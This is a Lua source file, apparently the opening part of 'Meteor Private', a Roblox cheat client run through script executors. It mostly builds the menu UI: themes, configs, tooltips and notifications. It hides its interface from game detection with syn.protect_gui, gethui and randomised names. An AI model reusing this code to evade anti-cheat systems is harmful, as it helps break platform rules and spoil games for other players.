
if (Drawing == nil) then
warn('Unfortunately, your executor is missing the Drawing library and is not supported by Meteor.')
warn('Consider upgrading to an exploit like Fluxus or KRNL')
return
end
-- { Make meteor folder } --
if (not isfile('Meteor')) then
makefolder('Meteor')
end
if (not isfile("Meteor/assets")) then
    makefolder("Meteor/assets")
end
if (not isfile("Meteor/configs")) then
    makefolder("Meteor/configs")
end
if (not isfile("Meteor/scripts")) then
    makefolder("Meteor/scripts")
end
    
-- { Version } --
local METEORVER = 'v0.6.3.1'
local IndentLevel1 = 8
local IndentLevel2 = 14
local IndentLevel3 = 22
local RightIndent = 14
-- { Wait for load } --
if not game:IsLoaded() then game.Loaded:Wait() end
-- { Microops } --
-- Services
local servContext = game:GetService('ContextActionService')
local servGui = game:GetService('GuiService')
local servHttp = game:GetService('HttpService')
local servNetwork = game:GetService('NetworkClient')
local servPlayers = game:GetService('Players')
local servRun = game:GetService('RunService')
local servTeleport = game:GetService('TeleportService')
local servTween = game:GetService('TweenService')
local servInput = game:GetService('UserInputService')
local servVim = game:GetService('VirtualInputManager')
-- Colors
local colRgb,colHsv,colNew = Color3.fromRGB, Color3.fromHSV, Color3.new
-- UDim2
local dimOffset, dimScale, dimNew = UDim2.fromOffset, UDim2.fromScale, UDim2.new
-- Instances
local instNew = Instance.new
local drawNew = Drawing.new
-- Vectors
local vec3, vec2 = Vector3.new, Vector2.new
-- CFrames
local cfrNew = CFrame.new
-- Task
local wait, delay, spawn = task.wait, task.delay, task.spawn
-- Math
local mathRand = math.random
local mathFloor = math.floor
local mathClamp = math.clamp
-- Table
local tabInsert,tabRemove,tabClear,tabFind = table.insert, table.remove, table.clear, table.find
-- Os
local date = os.date
local tick = tick
-- Other stuff
local workspace = workspace
local ipairs = ipairs
local game = game
local isrbxactive = isrbxactive
if (isrbxactive == nil) then
local active = true
servInput.WindowFocused:Connect(function() 
    active = true 
end)
servInput.WindowFocusReleased:Connect(function() 
    active = false
end)
getgenv().isrbxactive = function() 
    return active
end
isrbxactive = isrbxactive
end
-- { Load in some shit } --
local function DecodeThemeJson(json) 
-- Strip away comments
json = json:gsub('//[^\n]+','')
-- Convert JSON to lua
local stuff = servHttp:JSONDecode(json)
-- Get the theme data
local theme = stuff['theme']
-- Set up locals
local RLTHEME
local RLTHEMEFONT
do
    RLTHEME = {}
    RLTHEMEFONT = theme['Font']
    
    -- Make a switch statement
    local switch = {}
    switch['Generic_Outline']       = 'go' -- Thank god im switching away from indices
    switch['Generic_Shadow']        = 'gs'
    switch['Generic_Window']        = 'gw'
    switch['Generic_Enabled']       = 'ge'
    switch['Background_Menu']       = 'bm'
    switch['Background_Module']     = 'bo'
    switch['Background_Setting']    = 'bs'
    switch['Background_Dropdown']   = 'bd'
    switch['Hovering_Menu']         = 'hm'
    switch['Hovering_Module']       = 'ho'
    switch['Hovering_Setting']      = 'hs'
    switch['Hovering_Dropdown']     = 'hd'
    switch['Slider_Foreground']     = 'sf'
    switch['Slider_Background']     = 'sb'
    switch['Text_Main']             = 'tm'
    switch['Text_Outline']          = 'to'
    
    -- Go through all theme data and do stuff
    for Index, ThemeSetting in pairs(theme) do
        -- If this setting isnt a table (like the font) then continue
        if (type(ThemeSetting) ~= 'table') then continue end            
        -- If this setting doesn't have a valid id then continue
        if (not switch[Index]) then continue end
        -- Get theme options
        local Color1 = ThemeSetting['Color']
        local Color2 = ThemeSetting['Color2']
        local IsGradient = ThemeSetting['Gradient']
        local Transpar = ThemeSetting['Transparency']
        
        -- Add to RLTHEME
        local _ = {
            colRgb(Color1[1],Color1[2],Color1[3]);
            Transpar;
            IsGradient;
            Color2 and colRgb(Color2[1],Color2[2],Color2[3]);
            
            
        }
        RLTHEME[switch[Index]] = _
    end
end
-- Return
return RLTHEME, RLTHEMEFONT
end
if (isfile('Meteor/theme.jsonc')) then
_G.RLLOADERROR = 0
local ThemeData, Font
pcall(function()
    local FileData = readfile('Meteor/theme.jsonc')
    ThemeData, Font = DecodeThemeJson(FileData)
end)
if (ThemeData and Font) then
    _G.RLTHEMEDATA = ThemeData
    _G.RLTHEMEFONT = Font
else
    _G.RLLOADERROR = 2 -- Couldn't load theme properly (JSON decoder failed)
end
end
-- ! WARNING ! --
-- SHITTY THEME CODE BELOW
-- SKIP DOWN LIKE 2000 LINES TO GET TO THE GOOD STUFF
-- { Theme } --
local RLTHEMEDATA, RLTHEMEFONT do 
RLTHEMEFONT = _G.RLTHEMEFONT or 'SourceSans'
if (RLTHEMEFONT:match('https://')) then
    -- syn v3 forwards compatibility
    -- doubt this works but maybe it does
    
    local req = nil or
        (type(syn) == 'table' and syn.request) or 
        (type(http) == 'table' and http.request) or 
        (type(fluxus) == 'table' and fluxus.request) or
        http_request or request
    
    if (req) then
        local _ = req{
            Method = 'GET',
            Url = RLTHEMEFONT
        }
        if (_.Success) then
            writefile('rl-temp.ttf', _.Body)
            local works = pcall(function()
                RLTHEMEFONT = (getsynasset or getcustomasset or fakeasset or getfakeasset)('temp.ttf')
            end)
            if (not works) then
                RLTHEMEFONT = 'SourceSans'  
            end
            delfile('rl-temp.ttf')
        end
    else
        RLTHEMEFONT = 'SourceSans' 
    end
end
RLTHEMEDATA = _G.RLTHEMEDATA or {} do
    RLTHEMEDATA['go'] = RLTHEMEDATA['go'] or {}
    RLTHEMEDATA['gs'] = RLTHEMEDATA['gs'] or {}
    RLTHEMEDATA['gw'] = RLTHEMEDATA['gw'] or {}
    RLTHEMEDATA['ge'] = RLTHEMEDATA['ge'] or {}
    RLTHEMEDATA['bm'] = RLTHEMEDATA['bm'] or {}
    RLTHEMEDATA['bo'] = RLTHEMEDATA['bo'] or {}
    RLTHEMEDATA['bs'] = RLTHEMEDATA['bs'] or {}
    RLTHEMEDATA['bd'] = RLTHEMEDATA['bd'] or {}
    RLTHEMEDATA['hm'] = RLTHEMEDATA['hm'] or {}
    RLTHEMEDATA['ho'] = RLTHEMEDATA['ho'] or {}
    RLTHEMEDATA['hs'] = RLTHEMEDATA['hs'] or {}
    RLTHEMEDATA['hd'] = RLTHEMEDATA['hd'] or {}
    RLTHEMEDATA['sf'] = RLTHEMEDATA['sf'] or {}
    RLTHEMEDATA['sb'] = RLTHEMEDATA['sb'] or {}
    RLTHEMEDATA['tm'] = RLTHEMEDATA['tm'] or {}
    RLTHEMEDATA['to'] = RLTHEMEDATA['to'] or {}
end
-- so many fucking tables my god
do 
    -- generic
    RLTHEMEDATA['go'][1]   = RLTHEMEDATA['go'][1]  or colRgb(075, 075, 080); -- outline color
    RLTHEMEDATA['gs'][1]   = RLTHEMEDATA['gs'][1]  or colRgb(005, 005, 010); -- shadow
    RLTHEMEDATA['gw'][1]   = RLTHEMEDATA['gw'][1]  or colRgb(023, 022, 027); -- window background
    RLTHEMEDATA['ge'][1]   = RLTHEMEDATA['ge'][1]  or colRgb(225, 035, 061); -- enabled
    -- backgrounds
    RLTHEMEDATA['bm'][1]   = RLTHEMEDATA['bm'][1]  or colRgb(035, 035, 040); -- header background
    RLTHEMEDATA['bo'][1]   = RLTHEMEDATA['bo'][1]  or colRgb(030, 030, 035); -- object background
    RLTHEMEDATA['bs'][1]   = RLTHEMEDATA['bs'][1]  or colRgb(025, 025, 030); -- setting background
    RLTHEMEDATA['bd'][1]   = RLTHEMEDATA['bd'][1]  or colRgb(020, 020, 025); -- dropdown background
    -- backgrounds selected
    RLTHEMEDATA['hm'][1]   = RLTHEMEDATA['hm'][1]  or colRgb(038, 038, 043); -- header hovering
    RLTHEMEDATA['ho'][1]   = RLTHEMEDATA['ho'][1] or colRgb(033, 033, 038); -- object hovering
    RLTHEMEDATA['hs'][1]   = RLTHEMEDATA['hs'][1] or colRgb(028, 028, 033); -- setting hovering
    RLTHEMEDATA['hd'][1]   = RLTHEMEDATA['hd'][1] or colRgb(023, 023, 028); -- dropdown hovering
    -- slider 
    RLTHEMEDATA['sf'][1]   = RLTHEMEDATA['sf'][1] or colRgb(225, 075, 080); -- slider foreground
    RLTHEMEDATA['sb'][1]   = RLTHEMEDATA['sb'][1] or colRgb(033, 033, 038); -- slider background
    -- text   
    RLTHEMEDATA['tm'][1]   = RLTHEMEDATA['tm'][1] or colRgb(255, 255, 255); -- main text
    RLTHEMEDATA['to'][1]   = RLTHEMEDATA['to'][1] or colRgb(020, 020, 025); -- outline
end
do 
    RLTHEMEDATA['go'][2]   = RLTHEMEDATA['go'][2]  or 0;
    RLTHEMEDATA['gs'][2]   = RLTHEMEDATA['gs'][2]  or 0;
    RLTHEMEDATA['gw'][2]   = RLTHEMEDATA['gw'][2]  or 0.2;
    RLTHEMEDATA['ge'][2]   = RLTHEMEDATA['ge'][2]  or 0.7;
    RLTHEMEDATA['bm'][2]   = RLTHEMEDATA['bm'][2]  or 0;
    RLTHEMEDATA['bo'][2]   = RLTHEMEDATA['bo'][2]  or 0;
    RLTHEMEDATA['bs'][2]   = RLTHEMEDATA['bs'][2]  or 0;
    RLTHEMEDATA['bd'][2]   = RLTHEMEDATA['bd'][2]  or 0;
    RLTHEMEDATA['hm'][2]   = RLTHEMEDATA['hm'][2]  or 0;
    RLTHEMEDATA['ho'][2]   = RLTHEMEDATA['ho'][2]  or 0;
    RLTHEMEDATA['hs'][2]   = RLTHEMEDATA['hs'][2]  or 0;
    RLTHEMEDATA['hd'][2]   = RLTHEMEDATA['hd'][2]  or 0;
    RLTHEMEDATA['sf'][2]   = RLTHEMEDATA['sf'][2]  or 0;
    RLTHEMEDATA['sb'][2]   = RLTHEMEDATA['sb'][2]  or 0;
    RLTHEMEDATA['tm'][2]   = RLTHEMEDATA['tm'][2]  or 0;
    RLTHEMEDATA['to'][2]   = RLTHEMEDATA['to'][2]  or 0;
end
do 
    RLTHEMEDATA['go'][3]  = RLTHEMEDATA['go'][3] or false;
end
end
-- { UI functions / variables } --
local gradient,twn,ctwn,getnext,stroke,round,uierror
do
do
    local g1
    if (RLTHEMEDATA['go'][3]) then 
        g1 = ColorSequence.new{
            ColorSequenceKeypoint.new(0, RLTHEMEDATA['go'][1]);
            ColorSequenceKeypoint.new(1, RLTHEMEDATA['go'][4]);
        }
    end
    gradient = function(parent)
        local _ = instNew('UIGradient')
        _.Rotation = 45
        --_.Transparency = parent.Transparency
        _.Color = g1
        _.Parent = parent
    
        return _
    end
end
stroke = function(parent,mode, trans) 
    local _ = instNew('UIStroke')
    _.ApplyStrokeMode = mode or 'Contextual'
    _.Thickness = 1
    
    _.Transparency = trans or RLTHEMEDATA['go'][2]
    
    if (RLTHEMEDATA['go'][3]) then
        gradient(_) 
        _.Color = colNew(1,1,1)
    else
        _.Color = RLTHEMEDATA['go'][1]
    end
    
    _.Parent = parent
    return _
end
local info1, info2 = TweenInfo.new(0.1,10,1), TweenInfo.new(0.3,10,1)
function twn(twn_target, twn_settings, twn_long) 
    local tween = servTween:Create(
        twn_target,
        twn_long and info2 or info1,
        twn_settings
    )
    tween:Play()
    return tween
end
function ctwn(twn_target, twn_settings, twn_dur, twn_style, twn_dir) 
    local tween = servTween:Create(
        twn_target,
        TweenInfo.new(twn_dur,twn_style or 10,twn_dir or 1),
        twn_settings
    )
    tween:Play()
    return tween
end
function getnext() 
    local a = ''
    for i = 1, 5 do a = a .. utf8.char(mathRand(50,2000)) end 
    return a 
end
function round(num, place) 
    return mathFloor(((num+(place*.5)) / place)) * place
end
function uierror(func, prop, type) 
    error(('%s failed; %s is not of type %s'):format(func,prop,type), 3)
end
end
local W_WindowOpen = false or false
local RGBCOLOR
-- { UI } --
local ui = {} do 
local ui_Hotkeys = {}
local ui_Connections = {}
local ui_Menus = {}
local ui_Widgets = {}
local ui_Modules = {}
local Configs = {}
local rgbinsts = {}
local monitor_resolution = servGui:GetScreenResolution()
local monitor_inset = servGui:GetGuiInset()
local SaveDataFileName = "Meteor/Configs/" .. game.PlaceId .. ".txt"
local servHttp = game:GetService("HttpService")
function saveSettings()
    local json;
    if (writefile) then
        json = servHttp:JSONEncode(Configs);
        writefile(SaveDataFileName, json);
    else
        game.Players.LocalPlayer:Kick("Get krnl or synapse x")
    end
end
function loadSettings()
    if (readfile and isfile and isfile(SaveDataFileName)) then
        Configs = servHttp:JSONDecode(readfile(SaveDataFileName));
    end
end
-- connections
ui_Connections['i'] = servInput.InputBegan:Connect(function(io, gpe) 
    if (gpe == false and io.UserInputType.Value == 8) then
        local kcv = io.KeyCode.Value
        for i = 1, #ui_Hotkeys do 
            local hk = ui_Hotkeys[i]
            if (hk[1] == kcv) then
                hk[2]()
            end
        end
    end
end)
do
    local rgbtime = 0
    
    ui_Connections['r'] = servRun.RenderStepped:Connect(function(dt) 
        if (not isrbxactive()) then return end
        
        rgbtime = (rgbtime > 1 and 0 or rgbtime)+(dt*0.1)
        RGBCOLOR = colHsv(rgbtime,0.8,1)
        for i = 1, #rgbinsts do 
            local v = rgbinsts[i]
            v[1][v[2]] = RGBCOLOR
        end
    end)
end
-- Gui creation
local w_Screen
 local w_TooltipHeader
  local w_Tooltip
local w_Backframe
 local w_CreditFrame
 local w_FriendsFrame
 local w_ModFrame
  local w_Help
  local w_Modal
 local w_ProfileFrame
 local w_SettingsFrame
local w_ModList
 local w_ModListLayout
 local w_ModListTitle
 local w_ModListVer
local w_MouseCursor
local ModlistPadding = {
    dimOffset(-100, 0).X;
    dimOffset(8, 0).X;
    Enum.TextXAlignment.Left;
    'PaddingLeft';
} 
do 
    w_Screen = instNew('ScreenGui')
    w_Screen.IgnoreGuiInset = true
    w_Screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
    w_Screen.Name = getnext()
    pcall(function() 
        syn.protect_gui(w_Screen)
    end)
    w_Screen.DisplayOrder = 939393
    w_Screen.Parent = (gethui and gethui()) or (get_hidden_gui and get_hidden_gui()) or game.CoreGui
    
    w_Backframe = instNew('Frame')
    w_Backframe.BackgroundColor3 = RLTHEMEDATA['gw'][1]
    w_Backframe.BackgroundTransparency = RLTHEMEDATA['gw'][2]
    w_Backframe.BorderSizePixel = 0
    w_Backframe.ClipsDescendants = true
    w_Backframe.Position = dimNew(0, 0, 0, 0)
    w_Backframe.Size = dimScale(1,1)
    w_Backframe.Visible = false
    w_Backframe.Parent = w_Screen
    
    w_ModFrame = instNew('Frame')
    w_ModFrame.BackgroundTransparency = 1
    w_ModFrame.BorderSizePixel = 0
    w_ModFrame.ClipsDescendants = false
    w_ModFrame.Size = dimScale(1,1)
    w_ModFrame.Visible = true
    w_ModFrame.Parent = w_Backframe
    
    w_FriendsFrame = instNew('Frame')
    w_FriendsFrame.BackgroundTransparency = 1
    w_FriendsFrame.BorderSizePixel = 0
    w_FriendsFrame.ClipsDescendants = false
    w_FriendsFrame.Size = dimScale(1,1)
    w_FriendsFrame.Visible = false
    w_FriendsFrame.Parent = w_Backframe
    
    w_ProfileFrame = instNew('Frame')
    w_ProfileFrame.BackgroundTransparency = 1
    w_ProfileFrame.BorderSizePixel = 0
    w_ProfileFrame.ClipsDescendants = false
    w_ProfileFrame.Size = dimScale(1,1)
    w_ProfileFrame.Visible = false
    w_ProfileFrame.Parent = w_Backframe
    
    w_SettingsFrame = instNew('Frame')
    w_SettingsFrame.BackgroundTransparency = 1
    w_SettingsFrame.BorderSizePixel = 0
    w_SettingsFrame.ClipsDescendants = false
    w_SettingsFrame.Size = dimScale(1,1)
    w_SettingsFrame.Visible = false
    w_SettingsFrame.Parent = w_Backframe
    
    w_CreditFrame = instNew('Frame')
    w_CreditFrame.BackgroundTransparency = 1
    w_CreditFrame.BorderSizePixel = 0
    w_CreditFrame.ClipsDescendants = false
    w_CreditFrame.Size = dimScale(1,1)
    w_CreditFrame.Visible = false
    w_CreditFrame.Parent = w_Backframe
    
    do 
        
    end
    
    w_Modal = instNew('TextButton')
    w_Modal.Active = false
    w_Modal.BackgroundTransparency = 1
    w_Modal.Modal = true
    w_Modal.Size = dimOffset(1,1)
    w_Modal.Text = ''
    w_Modal.Parent = w_ModFrame
    
    w_Help = instNew('TextLabel')
    w_Help.AnchorPoint = vec2(1,1)
    w_Help.BackgroundTransparency = 1
    w_Help.Font = RLTHEMEFONT
    w_Help.Position = dimScale(1,1)
    w_Help.RichText = true
    w_Help.Size = dimOffset(300,300)
    w_Help.Text = ''
    w_Help.TextColor3 = RLTHEMEDATA['tm'][1]
    w_Help.TextSize = 20
    w_Help.TextStrokeColor3 = RLTHEMEDATA['to'][1]
    w_Help.TextStrokeTransparency = 0
    w_Help.TextXAlignment = 'Left'
    w_Help.TextYAlignment = 'Top'
    w_Help.Visible = false
    w_Help.ZIndex = 1
    w_Help.Parent = w_ModFrame
    
    w_ModList = instNew('Frame')
    w_ModList.AnchorPoint = vec2(0, 1)
    w_ModList.BackgroundColor3 = RLTHEMEDATA['gw'][1]
    w_ModList.BackgroundTransparency = 1
    w_ModList.BorderColor3 = RLTHEMEDATA['gs'][1]
    w_ModList.BorderMode = 'Inset'
    w_ModList.BorderSizePixel = 1
    w_ModList.Position = dimScale(0,1)
    w_ModList.Size = dimNew(0,200,0.3,0)
    w_ModList.Visible = false
    w_ModList.Parent = w_Screen
    
    w_ModListLayout = instNew('UIListLayout')
    w_ModListLayout.FillDirection = 'Vertical'
    w_ModListLayout.HorizontalAlignment = 'Left'
    w_ModListLayout.VerticalAlignment = 'Bottom'
    w_ModListLayout.Parent = w_ModList
    
    w_ModListTitle = instNew('TextLabel')
    w_ModListTitle.BackgroundTransparency = 1
    w_ModListTitle.Font = RLTHEMEFONT
    w_ModListTitle.LayoutOrder = 939
    w_ModListTitle.Size = dimNew(1, 0, 0, 30)
    w_ModListTitle.TextColor3 = RLTHEMEDATA['tm'][1]
    w_ModListTitle.TextSize = 24
    w_ModListTitle.Text = " ".."Meteor Private ".. METEORVER .. " "
    w_ModListTitle.TextStrokeColor3 = RLTHEMEDATA['to'][1]
    w_ModListTitle.TextStrokeTransparency = RLTHEMEDATA['to'][2]
    w_ModListTitle.TextTransparency = RLTHEMEDATA['tm'][1]
    w_ModListTitle.TextXAlignment = 'Left'
    w_ModListTitle.ZIndex = 5
    w_ModListTitle.Parent = w_ModList
    
    w_TooltipHeader = instNew('TextLabel')
    w_TooltipHeader.BackgroundColor3 = RLTHEMEDATA['bm'][1]
    w_TooltipHeader.BackgroundTransparency = RLTHEMEDATA['bm'][2]
    w_TooltipHeader.BorderSizePixel = 0
    w_TooltipHeader.Font = RLTHEMEFONT
    w_TooltipHeader.RichText = true
    w_TooltipHeader.Size = dimOffset(175,20)
    w_TooltipHeader.Text = 'Hi'
    w_TooltipHeader.TextColor3 = RLTHEMEDATA['tm'][1]
    w_TooltipHeader.TextSize = 19
    w_TooltipHeader.TextStrokeColor3 = RLTHEMEDATA['to'][1]
    w_TooltipHeader.TextStrokeTransparency = 0
    w_TooltipHeader.TextXAlignment = 'Center'
    w_TooltipHeader.Visible = false 
    w_TooltipHeader.ZIndex = 1500
    w_TooltipHeader.Parent = w_Screen
    
    stroke(w_TooltipHeader, 'Border')
    
    w_Tooltip = instNew('TextLabel')
    w_Tooltip.BackgroundColor3 = RLTHEMEDATA['gw'][1]
    w_Tooltip.BackgroundTransparency = RLTHEMEDATA['gw'][2]
    w_Tooltip.BorderSizePixel = 0
    w_Tooltip.Font = RLTHEMEFONT
    w_Tooltip.Position = dimOffset(0, 21)
    w_Tooltip.RichText = true
    w_Tooltip.Size = dimOffset(175,25)
    w_Tooltip.Text = ''
    w_Tooltip.TextColor3 = RLTHEMEDATA['tm'][1]
    w_Tooltip.TextSize = 17
    w_Tooltip.TextStrokeColor3 = RLTHEMEDATA['to'][1]
    w_Tooltip.TextStrokeTransparency = 0
    w_Tooltip.TextWrapped = true
    w_Tooltip.TextXAlignment = 'Left'
    w_Tooltip.TextYAlignment = 'Top'
    w_Tooltip.Visible = true 
    w_Tooltip.ZIndex = 1500
    w_Tooltip.Parent = w_TooltipHeader
    
    stroke(w_Tooltip, 'Border')
    
    local __ = instNew('UIPadding')
    __.PaddingLeft = dimOffset(5, 0).X
    --__.PaddingTop = dimOffset(0, 5).Y
    __.Parent = w_Tooltip
    
    w_Tooltip:GetPropertyChangedSignal('Text'):Connect(function() 
        w_Tooltip.Size = dimOffset(175,25)
        local n = dimOffset(0,5)
        for i = 1, 25 do 
            w_Tooltip.Size += n
            if (w_Tooltip.TextFits) then break end
        end
        w_Tooltip.Size += n
    end)
    
    w_MouseCursor = instNew('ImageLabel')
    w_MouseCursor.BackgroundTransparency = 1
    w_MouseCursor.Image = 'rbxassetid://8845749987'
    w_MouseCursor.ImageColor3 = RLTHEMEDATA['ge'][1]
    w_MouseCursor.ImageTransparency = 1
    w_MouseCursor.Position = dimOffset(150, 150)
    w_MouseCursor.Size = dimOffset(24, 24)
    w_MouseCursor.Visible = true
    w_MouseCursor.ZIndex = 1500
    w_MouseCursor.Parent = w_Screen
end
function ui:manageml(x1,x2,align,paddir) 
    ModlistPadding[1] = x1 and dimOffset(x1, 0).X or ModlistPadding[1]
    ModlistPadding[2] = x2 and dimOffset(x2, 0).X or ModlistPadding[2]
    ModlistPadding[4] = paddir or ModlistPadding[4]
    
    if (align and align ~= ModlistPadding[3]) then
        -- :troll
        local c = w_ModList:GetChildren()
        local _ = ModlistPadding[2]
        local __ = ModlistPadding[4]
        local ___ = __ == 'PaddingLeft' and 'PaddingRight' or __
        local ____ = dimOffset(0,0).X
        for i = 1, #c do
            local v = c[i]
            if (v.ClassName == 'TextLabel' and v ~= w_ModListTitle) then
                v.TextXAlignment = align
                local p = v.P
                p[__] = _
                p[___] = ____
            end
        end
        w_ModListTitle.TextXAlignment = align
        ModlistPadding[3] = align
    end
    
    
    return {
        w_ModList;
        w_ModListLayout;
        w_ModListTitle;
    }
end
ui_Connections['t'] = servRun.RenderStepped:Connect(function() 
    local pos = servInput:GetMouseLocation()
    local x,y = pos.X, pos.Y
    w_TooltipHeader.Position = dimOffset(x+15, y+15)
    w_MouseCursor.Position = dimOffset(x-4, y)
end)
local ModListEnable,ModListDisable,ModListInit,ModListModify do 
    local mods_instance = {}
    
    
    ModListEnable = function(name) 
        local b = mods_instance[name]
        
        b.TextXAlignment = ModlistPadding[3]
        b.Parent = w_ModList
        twn(b.P, {[ModlistPadding[4]] = ModlistPadding[2]},true)
        twn(b, {Size = dimNew(1, 0, 0, 24), TextTransparency = 0, TextStrokeTransparency = 0},true)
    end
    
    ModListDisable = function(name)
        local b = mods_instance[name]
        
        twn(b.P, {[ModlistPadding[4]] = ModlistPadding[1]},true)
        twn(b, {Size = dimNew(0, 0, 0, 0), TextTransparency = 1, TextStrokeTransparency = 1},true)
    end
    
    ModListModify = function(name, new) 
        mods_instance[name].Text = new
    end
    
    ModListInit = function(name) 
        local _ = instNew('TextLabel')
        _.Size = dimNew(0, 0, 0, 0)
        _.BackgroundTransparency = 1
        _.Font = RLTHEMEFONT
        _.TextXAlignment = ModlistPadding[3]
        _.TextColor3 = RLTHEMEDATA['tm'][1]
        _.TextSize = 22
        _.Text = name
        --_.Name = name
        _.RichText = true
        _.TextTransparency = 1
        _.TextStrokeTransparency = 1
        _.TextStrokeColor3 = RLTHEMEDATA['to'][1]
        _.ZIndex = 5
        
        mods_instance[name] = _
        
        tabInsert(rgbinsts, {_,'TextColor3'})
        
        
        local __ = instNew('UIPadding')
        __.Name = 'P'
        __[ModlistPadding[4]] = ModlistPadding[1]
        __.Parent = _
    end
end
-- Base class for stuff
local base_class = {} do 
    local s1,s2 = dimNew(1,0,1,0), dimNew(0,0,1,0)
    
    
    
    -- objtype_action_actiontype
    
    -- Menu funcs
    do
        base_class.menu_toggle = function(self) 
            local t = not self.MToggled
            if (t) then
                Configs[self.Name]["MenuToggled"] = true
                saveSettings()
            else
                Configs[self.Name]["MenuToggled"] = false
                saveSettings()
            end
            
            self.MToggled = t
            self.Menu.Visible = t
            twn(self.Icon, {Rotation = t and 0 or 180}, true)
        end
        base_class.menu_enable = function(self) 
            self.MToggled = true
            self.Menu.Visible = true
            twn(self.Icon, {Rotation = 0}, true)
        end
        base_class.menu_disable = function(self) 
            self.MToggled = false
            self.Menu.Visible = false
            twn(self.Icon, {Rotation = 180}, true)
        end
        base_class.menu_getstate = function(self) 
            return self.MToggled
        end
    end
    -- Notificatino
    do
        local notifs = {}
        local notifsounds = {
            high = 'rbxassetid://9009664674',
            low = 'rbxassetid://9009665420',
            none = '',
            warn = 'rbxassetid://9009666085'
        }
        
        local m_Notif
        local m_Description
        local m_Header
        local m_Icon
        local m_Text
        
        local m_Sound
        do 
            
            m_Notif = instNew('Frame')
            m_Notif.AnchorPoint = vec2(1,1)
            m_Notif.BackgroundColor3 = RLTHEMEDATA['bo'][1]
            m_Notif.BackgroundTransparency = RLTHEMEDATA['bo'][2]
            m_Notif.BorderSizePixel = 0
            m_Notif.Position = dimNew(1, 300, 1, -((#notifs*80)+((#notifs+1)*25)))
            m_Notif.Size = dimOffset(180, 90)
            m_Notif.ZIndex = 162
            --m_Notif.Parent = w_Screen
            
            stroke(m_Notif)
            
            m_Sound = instNew('Sound')
            --m_Sound.Playing = true
            --m_Sound.SoundId =notifsounds[tone or 3]
            m_Sound.Volume = 1
            m_Sound.TimePosition = 0.1
            --m_Sound.Parent = m_Notif 
            
            m_Progress = instNew('Frame')
            m_Progress.BackgroundColor3 = RLTHEMEDATA['ge'][1]
            m_Progress.BorderSizePixel = 0
            m_Progress.Position = dimOffset(0, 30)
            m_Progress.Size = dimNew(1,0,0,1)
            m_Progress.ZIndex = 163
            --m_Progress.Parent = m_Notif
            
            m_Header = instNew('Frame')
            m_Header.BackgroundColor3 = RLTHEMEDATA['bm'][1]
            m_Header.BackgroundTransparency = RLTHEMEDATA['bm'][2]
            m_Header.BorderSizePixel = 0
            m_Header.Size = dimNew(1,0,0,30)
            m_Header.ZIndex = 162
            --m_Header.Parent = m_Notif
            
            stroke(m_Header)
            
            m_Text = instNew('TextLabel')
            m_Text.BackgroundTransparency = 1
            m_Text.Font = RLTHEMEFONT
            m_Text.Position = dimOffset(32, 0)
            m_Text.RichText = true
            m_Text.Size = dimNew(1, -32, 1, 0)
            m_Text.Text = ''
            m_Text.TextColor3 = RLTHEMEDATA['tm'][1]
            m_Text.TextSize = 22
            m_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
            m_Text.TextStrokeTransparency = 0
            m_Text.TextXAlignment = 'Left'
            m_Text.ZIndex = 162
            --m_Text.Parent = m_Header
            
            m_Description = instNew('TextLabel')
            m_Description.BackgroundTransparency = 1
            m_Description.Font = RLTHEMEFONT
            m_Description.Position = dimOffset(4, 32)
            m_Description.RichText = true
            m_Description.Size = dimNew(1, -4, 1, -32)
            m_Description.Text = tostring(text)
            m_Description.TextColor3 = RLTHEMEDATA['tm'][1]
            m_Description.TextSize = 20
            m_Description.TextStrokeColor3 = RLTHEMEDATA['to'][1]
            m_Description.TextStrokeTransparency = 0
            m_Description.TextWrapped = true
            m_Description.TextXAlignment = 'Left'
            m_Description.TextYAlignment = 'Top'
            m_Description.ZIndex = 162
            --m_Description.Parent = m_Notif
            
            m_Icon = instNew('ImageLabel')
            m_Icon.Size = dimOffset(26, 26)
            m_Icon.Position = dimOffset(2,2)
            m_Icon.BackgroundTransparency = 1
            m_Icon.ImageColor3 = RLTHEMEDATA['ge'][1]
            
            --m_Icon.Image = not warning and 'rbxassetid://8854459207' or 'rbxassetid://8854458547'
            m_Icon.Rotation = 0
            m_Icon.ZIndex = 162
            --m_Icon.Parent = m_Header
        end
        
        
        
        
        function ui:Notify(title, text, duration, tone, warning) 
            duration = mathClamp(duration or 2, 0.1, 30)
            
            local m_Notif = m_Notif:Clone()
            local m_Description = m_Description:Clone()
            local m_Header = m_Header:Clone()
            local m_Progress = m_Progress:Clone()
            local m_Icon = m_Icon:Clone()
            local m_Text = m_Text:Clone()
            local m_Sound = m_Sound:Clone()
            
            do
                m_Description.Parent = m_Notif
                m_Sound.Parent = m_Notif
                m_Progress.Parent = m_Notif
                m_Header.Parent = m_Notif
                m_Icon.Parent = m_Header
                m_Text.Parent = m_Header
            end do
                m_Text.Text = title
                m_Description.Text = text
            end
            
            m_Sound.SoundId = notifsounds[tone or 'none']
            m_Sound.Playing = true
            
            m_Icon.Image = warning and 'rbxassetid://8854458547' or 'rbxassetid://8854459207'
            
            
            m_Notif.Position = dimNew(1, 300, 1, -((#notifs*80)+((#notifs+1)*25)))
            m_Notif.Parent = w_Screen
            
            for i = 1, 25 do
                if (m_Text.TextFits) then break end
                m_Notif.Size += dimOffset(25, 0)
            end
            
            
            
            tabInsert(notifs, m_Notif)
            twn(m_Notif, {Position = m_Notif.Position - dimOffset(325,0)}, true)
            local j = ctwn(m_Progress, {Size = dimOffset(0, 1)}, duration)
            j.Completed:Connect(function()
                do
                    for i = 1, #notifs do 
                        if (notifs[i] == m_Notif) then 
                            tabRemove(notifs, i) 
                        end 
                    end
                    for i = 1, #notifs do 
                        twn(notifs[i], {Position = dimNew(1, -25, 1, -(((i-1)*80)+(i*25)))}, true)
                    end
                    twn(m_Notif, {Position = dimNew(1, -25, 1, 310)}, true).Completed:Wait()
                    m_Notif:Destroy()
                end
            end)
        end
    end
        

    -- Module funcs
    do
        base_class.module_toggle_menu = function(self) 
            local t = not self.MToggled
            
            self.MToggled = t
            self.Menu.Visible = t
            
            twn(self.Icon, {Rotation = t and 360 or 0}, true)
            
            self.Icon.Text = t and '-' or '+'
            if (t) then
                Configs[self.Name]["MenuToggled"] = true
                saveSettings()
            else
                Configs[self.Name]["MenuToggled"] = false
                saveSettings()
            end
        end
        base_class.module_toggle_self = function(self, nonoti) 
            local t = not self.OToggled
            self.OToggled = t
            
            
            pcall(self.Flags.Toggled, t)
            pcall(self.Flags[t and 'Enabled' or 'Disabled'])
            
            twn(self.Effect, {Size = t and s1 or s2}, true)
            
            if not Configs[self.Name] then
